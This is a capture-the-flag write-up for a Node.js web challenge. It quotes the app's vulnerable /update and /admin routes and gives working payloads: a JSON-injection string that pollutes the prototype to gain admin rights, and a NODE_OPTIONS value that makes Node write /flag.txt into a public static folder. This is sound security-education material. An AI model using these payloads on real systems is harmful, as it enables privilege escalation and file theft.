## Okatu(8 solves, first blood)

Author: sqrtrev

(Solved by Jazzy, I just made an idea)

```
Javascript is fun too, well everything becomes fun when it's merged with Anime!

Flag is in /flag.txt

LINK

Author: _**KAHLA**_
```

check the part `app.post` for `/update`.

```js
app.post("/update",(req,res)=>{
	try{
	if(req.session.username && req.session.anime){
		if(req.body.username && req.body.anime){
			var query=JSON.parse(`{"$set":{"username":"${req.body.username}","anime":"${req.body.anime}"}}`);
			client.connect((err)=>{
				if (err) return res.render("update",{error:"An unknown error has occured"});
				const db=client.db("kimetsu");
				const collection=db.collection("users");
				collection.findOne({"username":req.body.username},(err,result)=>{
					if (err) {return res.render("update",{error:"An unknown error has occured"});console.log(err);}
					if (result) return res.render("update",{error:"This username already exists, Please use another one"});});
				collection.findOneAndUpdate({"username":req.session.username},query,{ returnOriginal: false },(err,result)=>{
					if (err) return res.render("update",{error:"An unknown error has occured"});
					var newUser={};
					var attrs=Object.keys(result.value);
					attrs.forEach((key)=>{
						newUser[key.trim()]=result.value[key];
						if(key.trim()==="isAdmin"){
							newUser["isAdmin"]=0;
						}
					});
					req.session.username=newUser.username;
					req.session.anime=newUser.anime;
					req.session.isAdmin=newUser.isAdmin;
					req.session.save();
					return res.render("update",{error:"Updated Successfully"});
				});
			});

		}
		else return res.render("update",{error:"An unknown error has occured"});
	}
	else res.redirect(302,"/login");
}
catch(err){
	console.log(err);
}
});
```

We can realize the vulnerability `Prototype Pollution` easily in this part, 

```js
var query=JSON.parse(`{"$set":{"username":"${req.body.username}","anime":"${req.body.anime}"}}`);

/... skip .../

var newUser={};
var attrs=Object.keys(result.value);
attrs.forEach((key)=>{
	newUser[key.trim()]=result.value[key];
	if(key.trim()==="isAdmin"){
		newUser["isAdmin"]=0;
	}
});
```

We can injection something for `Prototype Pollution` on `JSON.parse` part.

So, The payload will be like this

```
username=fboi", "__proto__ ":{"isAdmin":1}, "kms":"lms&anime=fboi
```

This will make the JSON object like this

```json
{"$set":{"username":"fboi", "__proto__ ":{"isAdmin":1}, "kms":"lms","anime":"fboi"}}
```

Of course, this will lead me for being admin by `Prototype Pollution`.

After having admin permission, we can do some acts with below code.

```js
app.post("/admin",(req,res)=>{
	if(req.session.isAdmin){
		var envName=req.body.envname;
		var env=req.body.env;
		var path=req.body.path;
		if(env && envName && path){
			if(path.includes("app.js") || path.includes("-")) return res.render("admin",{msg:"Not allowed"});
			process.env[envName] = env;
 			const child = execFile('node', [path], (error, stdout, stderr) => {
    		 if (error) {
			console.log(error);
        		return res.render("admin",{msg:"An error has occured"});
     		}
     		return res.render("admin",{msg:stdout});
 });
		}
		else res.redirect(302,"/home");
	}
	else res.redirect(302,"/home");
})
```

We will use node options for leaking flag.txt.

Node.js has the option `--report-filename` and `--report-uncaught-exception`. So, I'll use this.

As we don't know the location of application directory, I used `/proc/self/cwd`. And `/static` folder will be very helpful(We can access there!).

Following this, the payload will be:

```
envname=NODE_OPTIONS&env=--report-filename=/proc/self/cwd/static/js/siceme --report-uncaught-exception -r /flag.txt&path=config.js
```

So, the flag will be `http://url/static/js/siceme`.

